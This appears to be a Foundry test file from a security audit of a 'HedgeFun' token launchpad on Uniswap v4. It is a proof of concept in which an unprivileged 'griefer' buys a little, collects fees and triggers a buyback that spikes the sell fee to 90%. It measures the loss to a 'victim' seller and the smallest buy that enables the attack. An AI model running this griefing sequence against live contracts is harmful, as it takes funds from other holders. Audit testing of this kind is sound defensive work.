// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolIdLibrary, PoolId} from "v4-core/src/types/PoolId.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {HedgeFunBondingCurve} from "../src/v2/HedgeFunBondingCurve.sol";
import {HedgeFunV2Treasury} from "../src/v2/HedgeFunV2Treasury.sol";
import {V2LiquidityVault} from "../src/v2/V2LiquidityVault.sol";
import {V2FactoryFixture} from "./utils/V2FactoryFixture.sol";

/// @dev Round-3 triage: execute E-1's whole chain end to end with EVERY leg driven by an
///      unprivileged address, and price what the spike takes off a seller.
contract AuditTriage3b is V2FactoryFixture {
    using PoolIdLibrary for PoolKey;


    PoolSwapTest internal router;
    address internal griefer = address(0xBEEF);
    address internal victim = address(0xD00D);

    function setUp() public {
        _setUpV2(18);
        router = new PoolSwapTest(pm);
    }

    function _buyFun(address who, uint256 stockIn, PoolKey memory key, address token) internal {
        bool stockIs0 = address(stock) < token;
        vm.startPrank(who);
        stock.approve(address(router), type(uint256).max);
        router.swap(key, SwapParams({zeroForOne: stockIs0, amountSpecified: -int256(stockIn),
            sqrtPriceLimitX96: stockIs0 ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}), "");
        vm.stopPrank();
    }

    function _sellFun(address who, uint256 funIn, PoolKey memory key, address token) internal returns (uint256 got) {
        bool stockIs0 = address(stock) < token;
        uint256 before = stock.balanceOf(who);
        vm.startPrank(who);
        IERC20(token).approve(address(router), type(uint256).max);
        router.swap(key, SwapParams({zeroForOne: !stockIs0, amountSpecified: -int256(funIn),
            sqrtPriceLimitX96: !stockIs0 ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}), "");
        vm.stopPrank();
        got = stock.balanceOf(who) - before;
    }

    /// The whole of E-1, with nobody privileged: buy -> collectFees -> buyback -> 90% spike,
    /// then price what it costs the next seller.
    function test_T3_e1EndToEndByAnUnprivilegedCaller() public {
        (, HedgeFunBondingCurve curve, PoolKey memory key) = _launchV2(true);
        _graduateV2(curve);
        PoolId id = key.toId();
        address token = curve.token();
        HedgeFunV2Treasury t = HedgeFunV2Treasury(curve.treasury());
        V2LiquidityVault vault = V2LiquidityVault(hook.liquidityVaultOf(id));

        // Hand the victim a float position out of the launcher's own curve proceeds.
        uint256 float_ = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(victim, float_ / 10);
        uint256 victimBag = IERC20(token).balanceOf(victim);

        // Leg 1 -- anyone buys. 1 stock, tiny against the pool.
        stock.mint(griefer, 100e18);
        _buyFun(griefer, 1e18, key, token);

        // Leg 2 -- anyone collects.
        vm.prank(griefer);
        (uint256 stockFee, uint256 tokenBurned) = vault.collectFees();
        emit log_named_uint("stock-side LP fee from a 1-stock buy", stockFee);
        emit log_named_uint("token-side burn", tokenBurned);
        assertGt(stockFee, 0, "buy volume funds the pot");
        assertEq(t.buybackStock(), stockFee, "fee is buyback ammunition, not a lot");

        // Leg 3 -- anyone arms.
        assertEq(hook.sellRateBps(id), 1000, "flat before");
        vm.prank(griefer);
        t.buyback();
        assertEq(hook.sellRateBps(id), 9000, "armed by an unprivileged caller");

        // Price the victim's sell under the spike, and the same sell without it.
        uint256 snap = vm.snapshotState();
        uint256 spiked = _sellFun(victim, victimBag, key, token);
        vm.revertToState(snap);
        vm.warp(block.timestamp + 121);
        assertEq(hook.sellRateBps(id), 1000, "spike expired");
        uint256 flat = _sellFun(victim, victimBag, key, token);

        emit log_named_uint("victim stock out, spiked", spiked);
        emit log_named_uint("victim stock out, flat  ", flat);
        emit log_named_uint("ratio flat/spiked x1000 ", flat * 1000 / (spiked == 0 ? 1 : spiked));
        assertLt(spiked, flat, "the spike costs the seller");
    }

    /// How little buy volume is enough to refill the pot? Binary-search the smallest buy whose
    /// collectable stock fee is nonzero.
    function test_T3_smallestBuyThatRefillsThePot() public {
        (, HedgeFunBondingCurve curve, PoolKey memory key) = _launchV2(true);
        _graduateV2(curve);
        address token = curve.token();
        V2LiquidityVault vault = V2LiquidityVault(hook.liquidityVaultOf(key.toId()));
        stock.mint(griefer, 1000e18);

        uint256 lo = 1;
        uint256 hi = 1e18;
        for (uint256 i; i < 64; ++i) {
            if (lo + 1 >= hi) break;
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            _buyFun(griefer, mid, key, token);
            (uint256 fee,) = vault.collectFees();
            vm.revertToState(snap);
            if (fee > 0) hi = mid; else lo = mid;
        }
        emit log_named_uint("smallest buy (wei of stock) producing a collectable fee", hi);
        _buyFun(griefer, hi, key, token);
        (uint256 got,) = vault.collectFees();
        emit log_named_uint("fee it produced (wei of stock)", got);
        assertGt(got, 0, "the threshold is a real, reachable buy size");
    }
}


